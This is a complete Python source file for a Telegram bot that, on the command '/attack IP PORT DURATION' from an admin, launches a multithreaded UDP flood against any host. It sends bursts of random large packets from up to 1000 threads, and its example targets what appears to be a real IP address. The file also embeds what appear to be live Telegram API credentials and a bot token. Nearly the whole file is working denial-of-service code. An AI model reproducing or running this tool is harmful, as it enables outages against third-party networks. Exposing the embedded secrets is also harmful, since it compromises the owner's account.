import asyncio
import socket
import time
import os
import random
from threading import Thread
from pyrogram import Client, filters

# ===================== CONFIG =====================
API_ID = 37460343  # CHANGE KARO
API_HASH = "cf2d690b275e8d53a51fc69a15270437"  # CHANGE KARO
BOT_TOKEN = "8649236048:AAGcrxGdeSZpwcjtuMF-9zDKzyVISml-yNQ"  # CHANGE KARO
ADMIN_ID = 8819216195   # CHANGE KARO

# ===================== BOT INIT =====================
bot = Client("udp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ===================== ATTACK ENGINE =====================
class Attack:
    def __init__(self):
        self.running = False
        self.threads = 800  # 🔥 800 THREADS
        self.packets = 0
        self.target_ip = ""
        self.target_port = 0
        self.duration = 0
        self.start_time = 0
        
    def start(self, ip, port, duration):
        self.running = True
        self.packets = 0
        self.target_ip = ip
        self.target_port = port
        self.duration = duration
        self.start_time = time.time()
        
        # 🔥 100 DIFFERENT PAYLOADS
        payloads = [os.urandom(1490) for _ in range(100)]
        # 🔥 EXTRA LARGE PAYLOADS
        big_payloads = [os.urandom(2000) for _ in range(50)]
        all_payloads = payloads + big_payloads
        
        end = time.time() + duration
        
        def flood():
            # 🔥 HAR THREAD KA APNA SOCKET
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)  # 1MB buffer
            sock.settimeout(0.01)
            
            while time.time() < end and self.running:
                try:
                    # 🔥 RANDOM PAYLOAD
                    payload = random.choice(all_payloads)
                    # 🔥 EK SATH 5 PACKETS BHEJO
                    sock.sendto(payload, (ip, port))
                    sock.sendto(payload, (ip, port))
                    sock.sendto(payload, (ip, port))
                    sock.sendto(payload, (ip, port))
                    sock.sendto(payload, (ip, port))
                    self.packets += 5
                except socket.error:
                    # 🔥 SOCKET RESET
                    try:
                        sock.close()
                    except:
                        pass
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
                    sock.settimeout(0.01)
                except:
                    pass
        
        # 🔥 START 800 THREADS
        threads = []
        for _ in range(self.threads):
            t = Thread(target=flood, daemon=True)
            t.start()
            threads.append(t)
        
        # 🔥 THREADS KO STORE KARO (STOP KE LIYE)
        self.threads_list = threads
            
        return f"🔥 ATTACK ON {ip}:{port} STARTED! ({self.threads} THREADS)"
    
    def stop(self):
        self.running = False
        elapsed = int(time.time() - self.start_time) if self.start_time else 0
        speed = int(self.packets / max(elapsed, 1))
        return f"🛑 STOPPED!\n📦 Packets: {self.packets:,}\n⚡ Speed: {speed:,} pkts/s\n⏱️ Elapsed: {elapsed}s"
    
    def get_stats(self):
        elapsed = int(time.time() - self.start_time) if self.start_time else 0
        speed = int(self.packets / max(elapsed, 1)) if elapsed > 0 else 0
        return {
            "running": self.running,
            "target": f"{self.target_ip}:{self.target_port}",
            "threads": self.threads,
            "duration": self.duration,
            "elapsed": elapsed,
            "packets": self.packets,
            "speed": speed
        }

attack = Attack()

# ===================== COMMANDS =====================

@bot.on_message(filters.command("start"))
async def start_cmd(client, msg):
    await msg.reply(
        "🔥 **UDP BOT READY!**\n\n"
        "**COMMANDS:**\n"
        "`/attack IP PORT DURATION`\n"
        "`/stop`\n"
        "`/status`\n"
        "`/threads COUNT`\n\n"
        "**EXAMPLE:**\n"
        "`/attack 91.108.17.50 32000 60`"
    )

@bot.on_message(filters.command("attack"))
async def attack_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ **ADMIN ONLY!**")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply(
            "❌ **USAGE:** `/attack IP PORT DURATION`\n"
            "**EXAMPLE:** `/attack 91.108.17.50 32000 60`"
        )
    
    ip = parts[1]
    try:
        port = int(parts[2])
        duration = int(parts[3])
    except ValueError:
        return await msg.reply("❌ **INVALID PORT OR DURATION!**")
    
    if not (1 <= port <= 65535):
        return await msg.reply("❌ **PORT MUST BE 1-65535!**")
    
    if duration < 5:
        return await msg.reply("❌ **DURATION MINIMUM 5 SECONDS!**")
    
    if duration > 3600:
        duration = 3600
        await msg.reply("⏰ **DURATION LIMITED TO 3600s**")
    
    if attack.running:
        return await msg.reply("⚠️ **ATTACK ALREADY RUNNING!** Use `/stop` first")
    
    msg1 = await msg.reply(f"⏳ **STARTING ATTACK ON** `{ip}:{port}`...")
    
    result = attack.start(ip, port, duration)
    
    await msg1.edit_text(
        f"{result}\n\n"
        f"⏱️ **Duration:** `{duration}s`\n"
        f"🧵 **Threads:** `{attack.threads}`\n"
        f"📦 **Status:** `🟢 RUNNING`\n\n"
        f"_Use `/status` to see live stats_"
    )

@bot.on_message(filters.command("stop"))
async def stop_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ **ADMIN ONLY!**")
    
    if not attack.running:
        return await msg.reply("⚠️ **NO ATTACK RUNNING!**")
    
    result = attack.stop()
    await msg.reply(f"✅ {result}")

@bot.on_message(filters.command("status"))
async def status_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ **ADMIN ONLY!**")
    
    stats = attack.get_stats()
    
    status_icon = "🟢" if stats["running"] else "🔴"
    status_text = "RUNNING" if stats["running"] else "IDLE"
    
    await msg.reply(
        f"📊 **BOT STATUS**\n\n"
        f"{status_icon} **Status:** `{status_text}`\n"
        f"🎯 **Target:** `{stats['target']}`\n"
        f"🧵 **Threads:** `{stats['threads']}`\n"
        f"⏱️ **Duration:** `{stats['duration']}s`\n"
        f"⏰ **Elapsed:** `{stats['elapsed']}s`\n"
        f"📦 **Packets:** `{stats['packets']:,}`\n"
        f"⚡ **Speed:** `{stats['speed']:,} pkts/s`"
    )

@bot.on_message(filters.command("threads"))
async def threads_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ **ADMIN ONLY!**")
    
    if attack.running:
        return await msg.reply("⚠️ **STOP ATTACK FIRST!** Use `/stop`")
    
    parts = msg.text.split()
    if len(parts) < 2:
        return await msg.reply(f"❌ **CURRENT THREADS:** `{attack.threads}`\n**USAGE:** `/threads 800`")
    
    try:
        threads = int(parts[1])
        if 50 <= threads <= 1000:
            attack.threads = threads
            await msg.reply(f"✅ **THREADS SET TO:** `{threads}`")
        else:
            await msg.reply("❌ **THREADS MUST BE 50-1000!**")
    except ValueError:
        await msg.reply("❌ **INVALID NUMBER!**")

# ===================== ERROR HANDLER =====================
@bot.on_message(filters.command("ping"))
async def ping_cmd(client, msg):
    start = time.time()
    await msg.reply("🏓 **PONG!**")
    end = time.time()
    await msg.reply(f"⚡ **LATENCY:** `{(end-start)*1000:.0f}ms`")

# ===================== START BOT =====================
print("="*50)
print("🔥 UDP FLOOD BOT STARTED!")
print(f"👑 ADMIN ID: {ADMIN_ID}")
print(f"🧵 DEFAULT THREADS: {attack.threads}")
print("="*50)
print("📝 COMMANDS:")
print("  /attack IP PORT DURATION")
print("  /stop")
print("  /status")
print("  /threads COUNT")
print("  /ping")
print("="*50)

bot.run()
